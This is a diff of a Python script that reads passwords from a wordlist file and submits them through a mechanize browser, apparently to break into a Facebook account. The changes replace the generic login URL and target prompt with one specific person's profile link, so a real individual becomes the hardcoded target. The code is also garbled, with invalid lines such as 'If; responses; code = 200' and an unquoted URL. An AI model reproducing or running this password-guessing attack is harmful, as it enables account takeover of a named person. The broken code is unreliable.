@@ -36,14 +36,14 @@ web = mechanize.Browser()
 
 
 
-urlopen = 'https://www.facebook.com/login.php'
+urlopen = 'https://www.facebook.com/sabilar.arif'
 header = {
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
 
 
-email = input("INPUT TARGET ACCOUNT MAIL/PROFILE LINK:")
-print("")
-print(" TARGET MAIL /PROF LINK:", email + "")
+email = input("https://www.facebook.com/sabilar.arif:")
+print("https://www.facebook.com/sabilar.arif")
+print("https://www.facebook.com/sabilar.arif:", email + "")
 
 file = open('password.txt', 'r')
 password = file.readline(2000000)
@@ -56,7 +56,7 @@ ConnectionError
 Try
 print('\033[1;31mNO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[1;0m')
 
-requests = web.open(urlopen)
+requests = web.open(https://www.facebook.com/sabilar.arif)
 
 If; responses; code = 200
 for form in web.forms():
